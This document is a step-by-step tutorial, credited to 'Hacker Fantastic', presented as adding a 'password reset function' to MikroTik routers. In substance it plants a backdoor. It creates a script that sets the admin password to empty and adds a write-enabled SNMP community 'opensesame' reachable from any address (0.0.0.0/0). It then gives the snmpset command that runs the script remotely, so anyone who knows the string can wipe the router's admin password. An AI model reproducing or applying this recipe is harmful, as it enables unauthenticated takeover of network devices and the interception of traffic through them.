### Tutorial: Adding a Password Reset Function to MikroTik OS

In this tutorial, we will add a password reset function to MikroTik OS using a MikroTik script. We will create a script called "password reset" that sets the admin password to an empty string. We will then enable SNMP write access with the community string "opensesame" and verify that the SNMP service is running. Finally, we will use `snmpwalk` to query the scripts and `snmpset` to run the password reset script over SNMP.

#### Step 1: Create the Password Reset Script

1. **Access the MikroTik CLI**:
   - You can access the MikroTik CLI via SSH, Telnet, or the Winbox terminal. For SSH, use a terminal application like PuTTY or the built-in terminal on your operating system.
   - Connect to your MikroTik router using its IP address and login credentials.

   ```sh
   ssh admin@<router_ip_address>
   ```

2. **Create the Script**:
   - Use the following command to create a new script named "password reset" that changes the password of the "admin" user to an empty password.

   ```sh
   /system script add name="password reset" source="/user set admin password=\"\""
   ```

3. **Verify the Script**:
   - Verify that the script has been created correctly by listing all scripts.

   ```sh
   /system script print
   ```

   Output:
   ```
   Flags: I - invalid
    #   NAME            OWNER       LAST-STARTED                  RUN-COUNT
    0   password reset  admin       jan/01/1970 00:00:00          0
   ```

#### Step 2: Enable SNMP Write Access

1. **Enable SNMP**:
   - Enable the SNMP service on the router.

   ```sh
   /snmp set enabled=yes
   ```

2. **Configure SNMP Community**:
   - Add an SNMP community with write access. Replace `<community_name>` with `opensesame`.

   ```sh
   /snmp community add name=opensesame addresses=0.0.0.0/0 write-access=yes
   ```

3. **Verify SNMP Configuration**:
   - Verify that the SNMP service and community have been configured correctly.

   ```sh
   /snmp print
   /snmp community print
   ```

   Output:
   ```
   Flags: * - default 
    #   NAME       ADDRESSES           SECURITY  READ-ACCESS  WRITE-ACCESS
    0 * opensesame  0.0.0.0/0           none      yes          yes
   ```

#### Step 3: Check SNMP Service Status

1. **Check SNMP Service**:
   - Ensure that the SNMP service is running and enabled.

   ```sh
   /snmp print
   ```

   Output:
   ```
   enabled: yes
   contact: 
   location: 
   trap-target: 
   trap-community: 
   trap-version: 
   ```

#### Step 4: Query Scripts Using SNMP

1. **Install SNMP Tools**:
   - Ensure that you have SNMP tools installed on your system. On Debian-based systems, you can install them using:

   ```sh
   sudo apt-get install snmp
   ```

2. **Use `snmpwalk` to Query Scripts**:
   - Use the `snmpwalk` command to query the OID `1.3.6.1.4.1.14988.1.1.8` to list the scripts.

   ```sh
   snmpwalk -v 2c -c opensesame <router_ip_address> 1.3.6.1.4.1.14988.1.1.8
   ```

   - This command will list the scripts available on the MikroTik router.

#### Step 5: Run the Script Using SNMP

1. **Use `snmpset` to Run the Script**:
   - Use the `snmpset` command to run the "password reset" script. Replace `<router_ip_address>` with the IP address of your MikroTik router.

   ```sh
   snmpset -v 2c -c opensesame <router_ip_address> 1.3.6.1.4.1.14988.1.1.8.1.1.3.3 i 1
   ```

   - This command will execute the "password reset" script, setting the admin password to an empty string.

### Summary

By following these steps, you can add a password reset function to MikroTik OS using a MikroTik script. You will also enable SNMP write access, verify the SNMP service, query the scripts using `snmpwalk`, and run the script using `snmpset`. This guide assumes you have administrative access to the router and are familiar with basic networking concepts. If you encounter any issues, refer to the MikroTik documentation or seek assistance from MikroTik support or community forums.

---

**Author**: Hacker Fantastic  
**Date**: April 17, 2025  
**Website**: [https://hacker.house](https://hacker.house)